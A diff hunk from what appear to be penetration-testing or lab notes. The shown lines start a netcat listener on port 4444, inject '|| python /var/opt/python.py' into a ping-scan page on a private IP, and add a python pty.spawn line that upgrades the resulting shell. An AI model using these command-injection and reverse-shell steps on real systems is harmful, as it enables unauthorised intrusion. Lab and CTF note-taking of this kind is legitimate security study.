@@ -59,7 +59,7 @@
 			- connect to the network using the new interface
 	- run nc -lvp 4444 to initiate a listener on 4444
 	- on 192.168.0.12/5ecure/index.php ping scan, run '|| python /var/opt/python.py' 
-
+	- tty: python -c 'import pty; pty.spawn("/bin/bash")'
 
 
 
